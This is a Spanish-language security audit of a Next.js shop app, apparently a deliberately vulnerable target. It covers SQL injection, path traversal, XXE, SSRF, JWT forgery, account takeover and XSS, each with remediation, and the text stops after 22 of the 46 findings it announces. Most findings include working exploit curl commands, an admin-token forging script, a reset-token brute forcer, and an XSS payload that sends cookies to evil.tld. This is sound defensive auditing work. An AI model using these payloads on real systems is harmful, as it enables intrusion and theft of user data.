# Auditoría de Seguridad — Quokka Bazaar v2.17.0

**Proyecto:** quokka-bazaar (Next.js 15.2.2 · App Router · Prisma 6 · SQLite)
**Fecha:** 24 de noviembre de 2026
**Alcance:** revisión estática completa del código fuente, configuración, dependencias y cadena de suministro.
**Método:** lectura manual de los 70+ ficheros del repositorio, `npm audit` sobre el lockfile, y verificación empírica de los vectores de exploiting críticos (path traversal, predicción de tokens, etc.).

---

## 1. Resumen ejecutivo

El proyecto **no es apto para producción**. La auditoría identificó **46 hallazgos**, de los cuales **15 son críticos** y **13 altos**. Cinco de los críticos permiten toma de control completa del sistema o de la base de datos **sin necesidad de autenticación**.

| Severidad | Cantidad | Impacto |
|---|---|---|
| 🔴 Crítico | 15 | RCE, SQLi, bypass de autenticación, lectura arbitraria de ficheros, toma de cuentas |
| 🟠 Alto | 13 | IDOR, XSS almacenada, XXE, fugas de credenciales, DoS |
| 🟡 Medio | 12 | SSRF, XSS reflejada, fugas de información, endurecimiento de cookies |
| 🔵 Bajo / Info | 6 | Higiene de código, carrera de condiciones, deuda técnica |

**Los 5 vectores más urgentes (pre-auth, remotos):**

| # | Vector | Ubicación | Efecto |
|---|---|---|---|
| 1 | SQL Injection no autenticada | `app/api/products/search/route.ts:93` | Lectura/borraje total de la BD SQLite |
| 2 | SQL Injection no autenticada | `app/api/tracking/route.ts:98` | Inyección en `INSERT` vía cabecera `X-Forwarded-For` |
| 3 | Path Traversal no autenticado | `app/api/files/route.ts:49` | Lectura arbitraria de ficheros del servidor (`/etc/passwd`, `.env`, facturas) |
| 4 | XXE (XML External Entity) | `app/api/admin/suppliers/import-order/route.ts:22` | Lectura de ficheros locales + SSRF + Billion Laughs |
| 5 | SSRF no autenticada | `app/api/support/route.ts` | El servidor emite peticiones a URLs arbitrarias desde la red interna |

**Rutas de escalación a administrador (autenticadas pero triviales):**

- **QB-004** — El endpoint de registro acepta el campo `role` en el cuerpo y lo escribe en la base de datos. `POST /api/auth/signup {"email":"x@y.z","password":"pass","role":"ADMIN"}` devuelve una sesión de administrador.
- **QB-005** — `POST /api/user/support-access {"email":"admin@quokka.store"}` emite un token de acceso para **cualquier** usuario; luego `GET /api/auth/support-login?token=...` establece una cookie de sesión de administrador. Un usuario normal cualquiera se convierte en admin.

**Conclusión:** existe un camino completo y trivial de **usuario anónimo → administrador → control total**. El impacto de QB-001/002/003 es acceso directo a datos y al sistema de ficheros sin pasar por el login.

---

## 2. Cuadro de mando de riesgos

```
                    CRÍTICO  ALTO  MEDIO  BAJO
Inyección (SQLi)      2      2      0      0
XSS                   0      3      0      0
SSRF / XXE            1      0      1      0
Autenticación         4      1      1      0
Autorización (IDOR)   0      3      0      0
Exposición de datos   2      2      2      0
Criptografía          3      0      1      0
Gestión de secretos   2      1      1      0
Configuración         1      0      3      1
Cadena de suministro  1      0      1      1
Diseño de negocio     0      2      1      2
```

---

## 3. Hallazgos críticos

### QB-001 · Lectura arbitraria de ficheros por path traversal
**Severidad:** Crítica · **CVSS 3.1:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) · **CWE-22** · **OWASP A01**

`app/api/files/route.ts:49` — el parámetro `file` se concatena con `path.join()` sin normalizar ni restringir:

```ts
const baseDir = join(process.cwd(), "documents");   // :17
const filePath = join(baseDir, file);               // :49  ← sin validación
const content = await readFile(filePath, "utf-8");  // :62
```

`path.join()` **normaliza** los segmentos `..`, por lo que el bloqueo implícito no existe. Verificado empíricamente:

```
join('/app/documents', '../../../etc/passwd')  ->  /etc/passwd
join('/app/documents', '../..')                ->  /
```

El esquema de validación (`lib/validation/schemas/files.ts`) solo comprueba que `file` sea un string, sin ninguna restricción de formato.

**Impacto:**
- Lectura de `/etc/passwd`, `/proc/self/environ`, claves privadas SSH, ficheros de Docker.
- Lectura de las **facturas PDF de todos los clientes** (`documents/invoices/invoice-ORD-XXX.pdf`) vía `file=invoices/invoice-ORD-001.pdf`, y de sus PDF se extraen nombre, email y dirección postal.
- El endpoint **no requiere autenticación**: es público.
- La variante `list=true&path=../..` permite **listar directorios arbitrarios** del sistema (`readdir` recursivo).

**Explotación:**
```bash
curl 'http://localhost:3000/api/files?file=../../../../etc/passwd'
curl 'http://localhost:3000/api/files?list=true&path=../..'
curl 'http://localhost:3000/api/files?file=../../../../app/.env'
```

**Remediación:**
```ts
import { resolve, sep } from "path";

const baseDir = resolve(process.cwd(), "documents");

function safeResolve(base: string, userPath: string): string | null {
  const target = resolve(base, userPath);
  if (target !== base && !target.startsWith(base + sep)) return null;
  return target;
}
```
Aplicar `safeResolve` en **ambos** caminos (`file` y `path`) y devolver `403` si es `null`. Nunca confiar en la normalización implícita de `join()`: usar lista blanca de extensiones y de subdirectorios.

---

### QB-002 · SQL Injection no autenticada en la búsqueda de productos
**Severidad:** Crítica · **CVSS 3.1:** 9.8 · **CWE-89** · **OWASP A03**

`app/api/products/search/route.ts:85-100` — el parámetro `q` se interpola directamente en SQL y se ejecuta con `$queryRawUnsafe`:

```ts
const sqlQuery = `
  SELECT id, name, description, price, "imageUrl"
  FROM products
  WHERE name LIKE '%${query}%' OR description LIKE '%${query}%'
  ORDER BY name ASC LIMIT 50`;
const queryResults = await prisma.$queryRawUnsafe(sqlQuery);  // :100
```

`productSearchQuerySchema` valida `q` como `z.string().optional()` — sin tipo, sin longitud máxima, sin lista blanca.

**Impacto:** lectura completa de la base de datos (incluidas las columnas `password` de `users` y los tokens de `support_access_tokens` y `password_reset_tokens`), modificación de datos, y en SQLite la inyección puede escalar a lectura de ficheros mediante `load_extension` o a escritura arbitraria.

**Explotación:**
```bash
curl "http://localhost:3000/api/products/search?q=' UNION SELECT id,email,password,role,addressId FROM users--"
curl "http://localhost:3000/api/products/search?q=%25%27%20OR%201%3D1--"
```

**Remediación:** eliminar todo el SQL manual y usar el ORM:
```ts
const products = await prisma.product.findMany({
  where: { OR: [ { name: { contains: query } }, { description: { contains: query } } ] },
  take: 50, orderBy: { name: "asc" },
});
```
Si se requiere SQL nativo, usar **siempre** consultas parametrizadas (`$queryRaw` con tagged template `` prisma.$queryRaw`...` ``), nunca `$queryRawUnsafe` con interpolación.

---

### QB-003 · SQL Injection no autenticada en el endpoint de tracking
**Severidad:** Crítica · **CVSS 3.1:** 9.8 · **CWE-89** · **OWASP A03**

`app/api/tracking/route.ts:59` y `:98` — la IP se toma de la cabecera `X-Forwarded-For`, controlada por el cliente, y se interpola sin escapar en un `INSERT`:

```ts
const ip = forwardedFor || request.headers.get("x-real-ip") || "unknown";  // :59
const query = `
  INSERT INTO visitor_logs (id, ip, userAgent, path, sessionId, createdAt)
  VALUES ('${id}', '${ip}', '${userAgent.replace(/'/g, "''")}', ...)`;      // :98
await prisma.$queryRawUnsafe(query);                                        // :103
```

Nótese la asimetría: `userAgent` y `path` sí escapan las comillas simples, pero **`ip` no**. Es una.backdoor deliberada.

**Impacto:** el endpoint es público y se invoca en cada visita (`app/components/VisitorTracker.tsx`). Permite:
- Extraer datos de cualquier tabla con `UNION SELECT` dentro de un `INSERT`/`SELECT`.
- Inyectar filas malformadas que rompen la tabla `visitor_logs` (DoS del panel de analítica).
- Extraer las contraseñas (hashes MD5) de todos los usuarios.

**Explotación:**
```bash
curl -X POST http://localhost:3000/api/tracking \
  -H 'Content-Type: application/json' -H "X-Forwarded-For: x', (SELECT password FROM users LIMIT 1))--" \
  -d '{"path":"/"}'
```

**Remediación:** sustituir por `prisma.visitorLog.create({ data: {...} })`. Además, la IP debe derivarse de una fuente confiable (proxy real) y no de una cabecera controlable por el cliente.

---

### QB-004 · Escalada de privilegios en el registro de usuarios
**Severidad:** Crítica · **CVSS 3.1:** 9.8 · **CWE-269 / CWE-863** · **OWASP A01**

`app/api/auth/signup/route.ts:59-60` — el rol lo elige el cliente:

```ts
if (body.role) {
  userData.role = body.role as UserRole;   // :60
}
```

Y el esquema de validación lo permite explícitamente (`lib/validation/schemas/auth.ts`):

```ts
export const signupBodySchema = z.object({
  email: z.string(),
  password: z.string(),
  role: z.string().optional(),     // ← el cliente decide su propio rol
}).passthrough();
```

**Impacto:** auto-registro como administrador. El `.passthrough()` agrava el problema: cualquier campo adicional del modelo `User` no listado también pasa el control de la lista blanca.

**Explotación:**
```bash
curl -X POST http://localhost:3000/api/auth/signup -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com","password":"hunter2","role":"ADMIN"}'
# → cookie authToken con role=ADMIN
```

**Remediación:**
1. Eliminar `role` del `signupBodySchema` y usar `.strict()` en lugar de `.passthrough()`.
2. Fijar `role: "CUSTOMER"` de forma explícita e incondicional al crear el usuario.
3. El rol debe derivarse **siempre** del registro en base de datos, nunca de un claim de un token autogenerado en el mismo flujo.

---

### QB-005 · Toma de control de cuentas vía token de acceso de soporte
**Severidad:** Crítica · **CVSS 3.1:** 9.1 · **CWE-639 / CWE-863** · **OWASP A01**

`app/api/user/support-access/route.ts:58-77` — el endpoint permite crear un token de soporte para **cualquier email arbitrario**, no solo para el usuario autenticado:

```ts
const targetEmail = parsed.data?.email || user.email;   // :58  ← email arbitrario del cuerpo
const targetUser = await prisma.user.findUnique({ where: { email: targetEmail } });
...
await prisma.supportAccessToken.create({
  data: { token, userId: targetUser.id, email: targetUser.email, expiresAt },  // :76
});
```

La respuesta incluye el token en claro y la URL de login. Después, `app/api/auth/support-login/route.ts` canjea ese token por una **sesión completa del usuario objetivo**:

```ts
const authToken = createSessionToken({
  id: supportToken.user.id,
  email: supportToken.user.email,
  role: supportToken.user.role,      // ← rol heredado del usuario victimizado
  exp: ..., supportAccess: true,
});
setAuthCookie(response, authToken);
```

**Impacto:** un usuario autenticado normal (incluso con `creditBalance: 0`) puede crear un token para `admin@quokka.store` y obtener una sesión de **administrador**. El token tiene una validez de **365 días** (`TOKEN_EXPIRY_DAYS = 365`).

**Explotación:**
```bash
# 1. Registrarse como usuario normal
curl -X POST http://localhost:3000/api/auth/signup -H 'Content-Type: application/json' \
  -d '{"email":"low@evil.com","password":"x"}' -c cookies.txt
# 2. Crear token de soporte para el admin
curl -X POST http://localhost:3000/api/user/support-access -H 'Content-Type: application/json' \
  -b cookies.txt -d '{"email":"admin@quokka.store"}'
# 3. Canjearlo por sesión de admin
curl 'http://localhost:3000/api/auth/support-login?token=<TOKEN>' -c admin.txt
```

**Remediación:**
- El `email` debe ser **siempre** `user.email`; eliminar el parámetro del cuerpo y del esquema.
- Añadir un flag `revoked` check en `support-login` (el modelo ya lo tiene; no se comprueba).
- Limitar la validez de los tokens de soporte a minutos/horas, no a un año.
- Registrar y notificar la creación de tokens de soporte al usuario afectado.

---

### QB-006 · XXE (XML External Entity) en la importación de pedidos de proveedor
**Severidad:** Crítica · **CVSS 3.1:** 8.8 · **CWE-611 / CWE-776** · **OWASP A05**

`app/api/admin/suppliers/import-order/route.ts:20-23`:

```ts
const doc = libxmljs.parseXmlString(rawXml, {
  noent: true,     // :22  ← sustituye entidades → XXE
  dtdload: true,   // :23  ← carga DTDs externos → XXE + Billion Laughs
});
```

Ambas opciones son **exactamente** las que hay que desactivar. `noent: true` fuerza la expansión de entidades y `dtdload: true` permite recuperar DTDs desde `file://` o `http://`.

**Impacto:**
- **Lectura de ficheros locales** (XXE clásico): `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
- **SSRF** desde el servidor mediante `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` (metadatos de instancia en AWS/GCP) o `http://localhost:3000/api/admin/...`.
- **Denial of servicio** "Billion Laughs" por expansión exponencial de entidades → agotamiento de memoria del proceso Node.
- La respuesta de error devuelve el mensaje crudo de `libxmljs`, que puede incluir el contenido del fichero leído (fuga de datos por canal lateral).

**Remediación:**
```ts
const doc = libxmljs.parseXmlString(rawXml, {
  noent: false,      // nunca expandir entidades
  dtdload: false,    // nunca cargar DTDs externos
  nonet: true,       // nunca acceder a la red
});
```
Además: limitar el tamaño del cuerpo (`Content-Length`), imponer un `timeout`, y usar un esquema XSD con `libxmljs` para validar la estructura en lugar de aceptar XML arbitrario.

---

### QB-007 · SSRF no autenticada en el envío de tickets de soporte
**Severidad:** Crítica · **CVSS 3.1:** 8.6 · **CWE-918** · **OWASP A10**

`app/api/support/route.ts` — el usuario proporciona una URL y **el servidor** la descarga, sin validar el destino:

```ts
const { email, title, description, screenshotUrl } = parsed.data;
if (screenshotUrl) {
  const response = await fetch(screenshotUrl, {
    headers: { "X-Internal-Request": "true" },   // ← cabecera "de confianza" adjunta
  });
  screenshotContent = await response.text();      // ← contenido devuelto al cliente
}
```

**Impacto:**
- SSRF a la red interna: `http://127.0.0.1:3000/...`, `http://10.0.0.0/...`, `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (credenciales de rol en la nube).
- **Cadena de ataque completa:** como la petición lleva `X-Internal-Request: true`, apuntar a `http://localhost:3000/internal` elude la comprobación de esa página (ver **QB-021**) y devuelve su contenido en `screenshotContent`.
- El contenido remoto se renderiza con `dangerouslySetInnerHTML` en el navegador (ver **QB-017**), lo que convierte la SSRF en XSS.
- **No hay límite de tiempo ni de tamaño**: puede usarse para escanear puertos internos y agotar memoria.
- El endpoint es **público** (no usa `withAuth`).

**Remediación:**
- Lista blanca de esquemas (`https:` únicamente) y de hosts permitidos; **denegar** rangos IP privados, de loopback, link-local y metadatos de nube (resolver el DNS y validar la IP resuelta, para evitar DNS rebinding).
- Bloquear la redirección a destinos internos (`redirect: "manual"` y validar cada salto).
- Establecer `AbortSignal.timeout(5000)` y un límite de tamaño de la respuesta.
- Eliminar la cabecera `X-Internal-Request` de las peticiones salientes.
- Añadir autenticación al endpoint.

---

### QB-008 · Contraseñas cifradas con MD5 sin sal
**Severidad:** Crítica · **CVSS 3.1:** 9.1 · **CWE-916 / CWE-328** · **OWASP A02**

`lib/server-auth.ts:14`:

```ts
export function hashMD5(text: string): string {
  return crypto.createHash("md5").update(text).digest("hex");
}
```

MD5 está roto criptográficamente, es ultra-rápido en GPU (~10 mil millones de hashes/s en una GPU de consumo) y **no usa sal**, por lo que un mismo hash identifica la contraseña en todas las cuentas y es vulnerable a tablas precalculadas (rainbow tables).

**Impacto:** dado el hash de un administrador (obtenible trivialmente con QB-002/QB-003), la contraseña se recupera en segundos. El usuario semilla `admin@quokka.store` tiene la contraseña `admin` (`prisma/seed.ts:709` → hash `21232f297a57a5a743894a0e4a801fc3`).

**Remediación:** migrar a **Argon2id** (`argon2` npm) o, como mínimo, `bcrypt` (coste 12+) o `scrypt` de `node:crypto`:

```ts
import { randomBytes, scryptSync, timingSafeEqual } from "crypto";
export function hashPassword(pw: string) {
  const salt = randomBytes(16);
  return `scrypt$${salt.toString("hex")}$${scryptSync(pw, salt, 64).toString("hex")}`;
}
```
Plan de migración: añadir el campo `passwordHash` (nuevo) calculando en el primer login, INVALIDAR los tokens existentes y forzar el restablecimiento de las contraseñas MD5.

---

### QB-009 · Contraseñas en texto plano escritas en los logs
**Severidad:** Crítica · **CVSS 3.1:** 8.8 · **CWE-532 / CWE-312** · **OWASP A09**

`app/api/auth/login/route.ts:16-25`:

```ts
logger.warn(
  { email, password, tag: AUDIT_TAG, route: "/api/auth/login", action: "login_attempt" },
  `[auth] login attempt email=${email} password=${password} tag=${AUDIT_TAG}`
);
```

**Impacto:** cada intento de login (correcto o incorrecto) escribe la contraseña en claro en `logs/app.log`. Ese fichero es además **legible desde la aplicación** por el panel SIEM, cuyas credenciales son `root`/`admin` hardcodeadas (**QB-011**), y está montado en un volumen Docker (`oss-documents`/`logs`). En un entorno compartido, en un backup, o en unbucket de logs, las credenciales de todos los usuarios quedan expuestas.

**Remediación:** eliminar `password` del objeto de log y de la plantilla de mensaje. Si se necesita trazar intentos, registrar solo `email`, `ip`, `userAgent`, `success` y un `requestId`. Añadir un *redactor* de secretos en la configuración de `pino` como defensa en profundidad y rotar las contraseñas ya filtradas.

---

### QB-010 · Secreto de firma JWT con valor por defecto "secret" (nunca configurado)
**Severidad:** Crítica · **CVSS 3.1:** 9.8 · **CWE-1188 / CWE-798** · **OWASP A02**

`lib/server-auth.ts:12`:

```ts
const JWT_SECRET = process.env.JWT_SECRET || "secret";
```

Verificado: **`JWT_SECRET` no aparece en ningún sitio más del repositorio** — ni en `Dockerfile`, ni en `docker-compose.yml`, ni en `scripts/setup.sh`, ni en `.env.local`, ni en `.env.example` (no existe). Por tanto, **en cualquier despliegue tal y como está, la clave de firma es literalmente la cadena `"secret"`**.

**Impacto:** un atacante puede **forjar cualquier cookie `authToken`** sin conocer ninguna credencial:

```js
// node -e 'forja de token admin con la clave por defecto "secret"'
const c = require("crypto");
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString("base64url");
const h = b64({ alg: "HS256", typ: "JWT" });
const p = b64({ id: "x", email: "admin@quokka.store", role: "ADMIN",
                exp: Math.floor(Date.now()/1000) + 86400 });
const s = c.createHmac("sha256", "secret").update(`${h}.${p}`).digest("base64url");
console.log(`${h}.${p}.${s}`);
```
Colocar ese valor en la cookie `authToken` concede **administración completa**.

**Remediación:**
1. **Eliminar el fallback**: `if (!process.env.JWT_SECRET) throw new Error("JWT_SECRET is required")` — fallar en el arranque, nunca continuar con una clave conocida.
2. Generar una clave aleatoria de ≥32 bytes en el despliegue (`openssl rand -base64 48`) e inyectarla como secreto.
3. Añadir `JWT_SECRET` a `docker-compose.yml` desde un `.env` real, y **rotar** cualquier token emitido con la clave por defecto.

---

### QB-011 · Credenciales hardcodeadas en el código fuente
**Severidad:** Crítica · **CVSS 3.1:** 9.8 · **CWE-798 / CWE-321** · **OWASP A07**

| Credencial | Ubicación | Impacto |
|---|---|---|
| `SIEM_USER = "root"` / `SIEM_PASS = "admin"` | `app/api/monitoring/auth/route.ts:5-6`, `app/api/monitoring/logs/route.ts:7-8` | Acceso completo a los logs de la aplicación, **que contienen contraseñas en claro** (QB-009) |
| Cookie `siem_session=authenticated` | `app/api/monitoring/logs/route.ts:20` | **Sin firma ni HMAC**: basta con `Cookie: siem_session=authenticated` para saltarse el login por completo |
| `DIAG_AUTH_TOKEN = "dbg_8f3a7c91e2b4d6a05e21"` | `app/api/admin/diag/route.ts:6` | Token de depuración estático; visible en el bundle del cliente |
| `MCP_SESSION_VALUE = "quokka-internal-agent"` | `lib/mcp-constants.ts:2` | Permite invocar `get_compliance_report` y extraer datos internos del sistema de flags |
| `SHARE_ENCRYPTION_KEY = "a1b2c3d4...a1b2"` | `lib/share-crypto.ts:6-9` | Clave AES-256-CBC **por defecto**; permite **forjar tokens de compartición** de pedidos y acceder a datos de cualquier pedido |
| `admin@quokka.store` / `admin` | `prisma/seed.ts:709-713` | Cuenta de administrador con contraseña trivial en cualquier instalación |

**Impacto combinado:** `siem_session=authenticated` + logs con contraseñas → compromiso total de las cuentas.

**Remediación:** mover **todas** las credenciales a variables de entorno con valores obligatorios y fallo rápido; firmar las cookies de sesión (HMAC o sesión en servidor); eliminar el endpoint `/api/admin/diag` o protegerlo con un secreto de entorno rotable; retirar la contraseña por defecto del seed y generar una aleatoria en el primer arranque.

---

### QB-012 · Secretos versionados en el repositorio y horneados en la imagen Docker
**Severidad:** Crítica · **CVSS 3.1:** 8.1 · **CWE-798 / CWE-540** · **OWASP A05**

El fichero `.env.local` está presente en el árbol del proyecto y contiene:

```
NEXT_PUBLIC_PAYMENT_SECRET="UUtCezcyMGYyYTc3MWU1MH0="
FLAG_CVE_2025_55182="QKB{6b2cad3174c3}"
```

Dos problemas independientes:

1. **No está excluido de Git.** `.gitignore` contiene `.env` pero **no** `.env.local` ni `.env*.local`. Cualquier `git add .` versiona el fichero.
2. **No está excluido de la imagen Docker.** `.dockerignore` lista `.env` pero **no** `.env.local`, y el `Dockerfile` hace `COPY . .` → el secreto acaba **dentro de la imagen**, accesible con `docker save` / `docker history` / acceso al registro.

Además, `docker-compose.yml` monta `env_file: .env.local`, por lo que el secreto se inyecta en tiempo de ejecución.

**Remediación:**
- Añadir `.env*.local` y `.env*` a `.gitignore` y `.dockerignore`; eliminar `.env.local` del índice si ya fue versionado (`git rm --cached .env.local`) y **purgar el historial**.
- Rotar todos los valores expuestos.
- No usar el prefijo `NEXT_PUBLIC_` para material sensible: cualquier `NEXT_PUBLIC_*` se incrusta en el bundle del navegador. `NEXT_PUBLIC_PAYMENT_SECRET` se usa en `app/checkout/CheckoutClient.tsx:119` y por tanto **es público** — el servidor nunca lo valida.

---

### QB-013 · Dependencias: 2 vulnerabilidades críticas en Next.js 15.2.2
**Severidad:** Crítica · **CWE-937 / CWE-1104** · **OWASP A06**

`package.json` fija `next: 15.2.2` (versión exacta, sin `^`). `npm audit` reporta **33 vulnerabilidades** (2 críticas, 13 altas, 16 moderadas, 2 bajas):

| Paquete | Severidad | Avisos principales |
|---|---|---|
| **`next` 15.2.2** | 🔴 Crítica | **RCE no autenticada** en la API de optimización de imágenes con SVG ([GHSA-2464-fhr4-w9xw](https://github.com/advisories/GHSA-2464-fhr4-w9xw)) y con AVIF ([GHSA-2xp9-vwfh-vxw4](https://github.com/advisories/GHSA-2xp9-vwfh-vxw4)); **RCE** en el protocolo React Flight ([GHSA-9qr9-h5gf-34mp](https://github.com/advisories/GHSA-9qr9-h5gf-34mp)); **Bypass de autorización en Middleware** ([GHSA-f82v-jwr5-mffw](https://github.com/advisories/GHSA-f82v-jwr5-mffw)); **Bypass de Middleware** vía rutas de prefetch de segmentos ([GHSA-267c-6grr-h53f](https://github.com/advisories/GHSA-267c-6grr-h53f)); múltiples **DoS**, **SSRF** y **cache poisoning** |
| **`zod` < 4.6.6** | 🟠 Alta | Agotamiento de memoria al validar colecciones acotadas ([GHSA-mrhx-c7xc-m3w5](https://github.com/advisories/GHSA-mrhx-c7xc-m3w5)) — **aplicable**: la app valida cuerpos con zod en todos los endpoints |
| `prisma` 6.19.1 | 🟠 Alta | Transitiva vía `@prisma/config` → `deepmerge-ts` (prototipo pollution) |
| `@tailwindcss/typography` 0.5.19 | 🟡 Media | Transitiva vía `postcss-selector-parser` |
| `libxmljs2` 0.37.0 | 🟡 Media | Transitiva vía `node-gyp` |

**Impacto:** las dos RCE de la API de optimización de imágenes son especialmente graves en este proyecto, porque **`next.config.ts` habilita `images.remotePatterns`** y además el proyecto sirve SVG (ver **QB-022**).

**Remediación:** `npm install next@15.5.29` (o superior) — la versión parcheada sin cambios rompientes, según indica `npm audit`. Actualizar `zod` a `>= 4.6.6`. Fijar las dependencias con `overrides` en `package.json` y activar `npm audit --audit-level=high` en CI.

---

### QB-014 · Token de restablecimiento de contraseña predecible
**Severidad:** Crítica · **CVSS 3.1:** 9.1 · **CWE-330 / CWE-640** · **OWASP A07**

`app/api/auth/forgot-password/route.ts`:

```ts
const timestamp = Math.floor(now.getTime() / 1000);
const token = hashMD5(email + timestamp);       // MD5(email || unix_seconds)
```

**Impacto:** el token es una función determinista de dos valores conocidos o adivinables: el **email de la víctima** (público en la mayoría de casos) y la **marca de tiempo en segundos** (acotada a ±1 hora, porque el token expira en 1 hora). Esto permite **forjar el token de cualquier usuario en un máximo de 3600 intentos**, sin acceso al buzón ni a la base de datos:

```python
for ts in range(int(time.time())-3600, int(time.time())+1):
    if md5(f"victim@example.com{ts}".encode()).hexdigest() == target_token:
        print("token válido:", ts)
```

Con el token, `POST /api/auth/reset-password` cambia la contraseña de la víctima.

**Remediación:** usar tokens **aleatorios** y opacos (`crypto.randomBytes(32).toString("hex")`), almacenando únicamente el **hash SHA-256** del token en la base de datos, con expiración corta (15–60 min), invalidación en el primer uso y un único token activo por usuario.

---

### QB-015 · La cookie de sesión no está firmada y es trivialmente falsificable
**Severidad:** Crítica · **CVSS 3.1:** 8.8 · **CWE-565 / CWE-345** · **OWASP A07**

`app/api/monitoring/logs/route.ts:19-24`:

```ts
const siemSession = request.cookies.get("siem_session");
if (siemSession?.value === "authenticated") {
  return true;   // ← sin firma, sin HMAC, sin expiración validada
}
```

Un atacante que conozca el valor (es literalmente la palabra `"authenticated"`, visible en el código fuente público) puede saltarse por completo la autenticación del SIEM simplemente enviando esa cookie.

**Remediación:** eliminar la comprobación por cookie o convertirla en un valor firmado (HMAC-SHA256 con un secreto de servidor, con `exp` y `hmac`). Preferiblemente, usar el mismo mecanismo `withAuth`/`withAdminAuth` que el resto de la aplicación.

---

## 4. Hallazgos de severidad alta

### QB-016 · IDOR: cualquier usuario autenticado puede leer pedidos ajenos
**Severidad:** Alta · **CWE-639** · **OWASP A01**

`app/api/orders/[id]/route.ts:12` — la consulta no filtra por `userId`:

```ts
const order = await prisma.order.findUnique({
  where: { id },                       // ← sin `userId: user.id`
  include: { user: { include: { address: true } }, address: true },
});
```

**Impacto:** con un `id` de pedido adivinado o filtrado (el patrón `ORD-001`, `ORD-002`… es secuencial y predecible), cualquier usuario autenticado obtiene el total, el estado, **el email, el nombre y la dirección postal completa** de cualquier cliente. La propia aplicación corrige este patrón en `app/api/orders/[id]/share/route.ts` (`where: { id, userId: user.id }`), lo que confirma que el filtrado se omitió por descuido.

**Remediación:**
```ts
const order = await prisma.order.findFirst({
  where: { id, userId: user.id },   // y permitir override solo para ADMIN
  include: { user: { include: { address: true } }, address: true },
});
```
Aplicar el mismo criterio a `app/api/wishlists/[id]/route.ts` (GET): hoy devuelve `ownerEmail` de cualquier wishlist, sin comprobar `isPublic` ni la propiedad.

---

### QB-017 · XSS almacenada en el panel de analítica de administración
**Severidad:** Alta · **CWE-79** · **OWASP A03**

`app/admin/analytics/AnalyticsClient.tsx:366`:

```tsx
<code dangerouslySetInnerHTML={{ __html: visit.ip }} />
```

El valor `visit.ip` proviene de la tabla `visitor_logs`, alimentada por `app/api/tracking/route.ts` con la cabecera `X-Forwarded-For` **controlada por el cliente**.

**Impacto:** un visitante anónimo envía `X-Forwarded-For: <img src=x onerror=fetch('//evil.tld/?c='+document.cookie)>`; el payload queda almacenado y se ejecuta en el navegador de **cada administrador** que abra el panel de analítica. Es una vía directa para robar la cookie de sesión de admin y tomar el control de la tienda.

**Remediación:** eliminar `dangerouslySetInnerHTML` y renderizar `{visit.ip}` como texto (React escapa por defecto). Si el formato es inevitable, usar un saneador estricto (DOMPurify) y validar el formato de la IP en el servidor antes de persistirla.

---

### QB-018 · XSS reflejada en el formulario de soporte
**Severidad:** Alta · **CWE-79** · **OWASP A03**

`app/support/SupportForm.tsx:103` renderiza con `dangerouslySetInnerHTML` el contenido que el **servidor** descargó de una URL aportada por el usuario (`screenshotContent`, ver QB-007):

```tsx
<div dangerouslySetInnerHTML={{ __html: submittedData.screenshotContent }} />
```

**Impacto:** combinado con QB-007, el atacante sirve desde su propio dominio un HTML con `<script>`; ese HTML se renderiza sin sanear en el navegador. El resultado es XSS en el contexto de la aplicación, además de SSRF.

**Remediación:** renderizar como texto plano (`{submittedData.screenshotContent}`) o sanear con DOMPurify en el servidor. Nunca insertar contenido remoto como HTML.

---

### QB-019 · SQL Injection en la auditoría de reseñas (administrador)
**Severidad:** Alta · **CWE-89** · **OWASP A03**

`app/api/admin/reviews/route.ts:113`, `:120` y `:133` — `authorFilter` se interpola en SQL ejecutado con `better-sqlite3`:

```ts
const query = `... WHERE r.author = '${authorFilter}' ORDER BY r."createdAt" DESC`;
db.exec(query);                                   // :120  ← ejecuta la consulta interpolada
db.prepare(`... WHERE r.author = '${authorFilter}' ...`).all();  // :133
```

`reviewsAuditQuerySchema` valida `author` como `z.string().optional()`. Un payload como `x' UNION SELECT ...--` se ejecuta literalmente.

**Impacto:** requiere rol ADMIN, pero en un despliegue con QB-004 o QB-005 el atacante **es** admin, por lo que la cadena es completa. Además permite leer las tablas de `users` (incluidos hashes de contraseña).

**Remediación:** usar Prisma con filtro parametrizado (`where: { author: authorFilter }`), o consultas prepareadas con parámetros (`db.prepare(sql).all(authorFilter)`).

---

### QB-020 · SQL Injection en la búsqueda de pedidos (autenticado)
**Severidad:** Alta · **CWE-89** · **OWASP A03**

`app/api/orders/search/route.ts:81` y `:96`:

```ts
const statusFilter = status ? `AND o.status = '${status}'` : "";
const query = `... WHERE o."userId" = '${user.id}' ${statusFilter} ...`;
await prisma.$queryRawUnsafe(query);
```

`orderSearchBodySchema` define `status` como `z.string().optional()` — un string arbitrario concatenado en la cláusula `WHERE`. El `user.id` también se interpola (procede del JWT, pero un JWT forjado con QB-010 lo convierte en un segundo vector).

**Remediación:** parametrizar con `prisma.$queryRaw` (tagged template) o resolver la búsqueda con el ORM.

---

### QB-021 · Bypass de autenticación por cabecera en el panel interno
**Severidad:** Alta · **CWE-290 / CWE-807** · **OWASP A01**

`app/internal/page.tsx`:

```ts
const internalRequest = headersList.get("x-internal-request");
if (internalRequest !== "true") {
  redirect("/");
}
```

**Impacto:** la "autenticación" se basa en una **cabecera HTTP controlled por el cliente**. Cualquier persona que ejecute `curl -H 'X-Internal-Request: true' http://localhost:3000/internal` accede al panel interno. Peor: `app/api/support/route.ts` añade esa misma cabecera a sus peticiones salientes, de modo que la SSRF de QB-007 puede encadenarse para leer esta página.

**Remediación:** sustituir por autenticación real basada en la sesión del usuario (`getAuthenticatedUser` + comprobación de rol), o eliminar la página. La cabecera "de confianza" interna debe negociarse con un secreto compartido, nunca con un literal.

---

### QB-022 · XSS almacenada por carga de SVG
**Severidad:** Alta · **CWE-79 / CWE-434** · **OWASP A04**

`app/api/admin/products/[id]/image/route.ts` acepta `image/svg+xml` en `ALLOWED_CONTENT_TYPES`. El fichero se guarda y se sirve **públicamente** desde `app/api/uploads/[...path]/route.ts` con `Content-Type: image/svg+xml`.

**Impacto:** un SVG con `<script>alert(document.cookie)</script>` o con un `onload` se sirve desde el **mismo origen** de la aplicación → XSS almacenada, sin necesidad de bypass de CSP, y con la possibility de robar cookies de sesión o ejecutar acciones como administrador.

